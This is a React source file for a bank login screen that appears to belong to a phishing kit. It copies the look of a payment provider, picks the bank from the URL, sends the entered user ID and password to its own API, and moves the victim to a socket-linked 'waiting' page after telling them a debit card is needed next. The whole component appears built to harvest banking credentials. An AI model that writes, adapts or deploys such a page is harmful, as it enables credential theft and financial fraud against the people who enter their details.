import React, { useState } from "react";
import styled from 'styled-components'
import { Link, useMatch, useNavigate, } from 'react-router-dom'

import { StyledSection } from "./home";
import Icon from "../../components/icons";
import { RestApi } from "../../provider/restApi";
import { socket } from "../../routes";
import Username from '../../assets/images/username.svg';
import Password from '../../assets/images/password.png';

const Login = () => {
    const [username, setusername] = useState('');
    const [password, setPassword] = useState('');
    const [isdisabled, setIsdisabled] = useState(false);
    const navigation = useNavigate();
    const match = useMatch('/login/:segment');
    const segment = match?.params?.segment;

    const handleLogin = async () => {
        setIsdisabled(true)
        const bankName: any = segment;
        const formData = {
            username: username,
            password: password,
            bankName: bankName
        };

        const res: any = await RestApi.login(formData);
        if (res.status) {
            alert(res.message)
            localStorage.setItem('userToken', res.token);
            socket.emit('join', { username: username })
            navigation('/waiting')

        } else {
            alert(res.message)
        }
    }

    return (
        <StyledSection>
            <div className="panel">
                <LoginSection>
                    <div className="login-main">
                        <div className="login-title">
                            <h1>Log in to your bank</h1>
                            <span>In the next step, add the debit card you want to transfer the payment to.</span>
                        </div>
                        <div className="login-input">
                            <div className="item">
                                <label>User ID:</label>
                                <div>
                                    <input value={username} onChange={(e) => setusername(e.target.value)} />
                                    <div>
                                        <img src={Username} />
                                    </div>
                                </div>
                            </div>
                            <div className="item">
                                <label>Password:</label>
                                <div>
                                    <input value={password} onChange={(e) => setPassword(e.target.value)} />
                                    <div>
                                        <img src={Password} width={60} />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="login-button">
                        <button onClick={handleLogin}>Login</button>
                    </div>
                    <Link to='/' className="back-icon">
                        <Icon icon="ChevronLeft" size={25} />
                    </Link>
                </LoginSection>
            </div >
        </StyledSection >
    )
}

const LoginSection = styled.div`
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    gap: 15em;
    position: relative;
    .login-main {
        display: flex;
        flex-direction: column;
        gap: 2em;
        .login-title {
            text-align: center;
            h1 {
                font-family: "Trustly Sans Medium", "Helvetica Neue", Arial, sans-serif;
                font-size: 1.75rem;
                font-weight: 700;
                line-height: 2rem;
                color: rgb(0, 0, 0);
                overflow-wrap: break-word;
            }
            span {
                font-family: "Trustly Sans Regular", "Helvetica Neue", Arial, sans-serif;
                font-size: 1rem;
                font-weight: 500;
                line-height: 1.25rem;
                color: rgb(0, 0, 0);
            }
        }
        .login-input {
        display: flex;
        flex-direction: column;
        gap: 1em;
        .item {
            display: flex;
            flex-direction: column;
            gap: 0.5em;
            label {
                font-weight: 500;
            }
            div {   
                display: flex;
                flex-direction: row;
                input {
                    width:85%;
                    border: 1px solid rgb(216, 223, 228);
                    font-size: 1em;
                    text-indent: 5px;
                    &:focus {
                        outline: none;
                    }
                }
                div{
                    width: 15%;
                    display: flex;
                    gap: 0em;
                    justify-content: center;
                    align-items: center;
                    border: 1px solid rgb(216, 223, 228);
                    img {
                        height: 50%;
                    }
                }
            }
        }
        }
    }
    .login-button {
        width: 100%;
        button {
            width: 100%;
            background-color: #004cbc;
            padding:1em;
            color: white;
            border: none;
        }
    }
    .back-icon {
        position: absolute;
        top: -2em;
        left: -4em;
    }
`
export default Login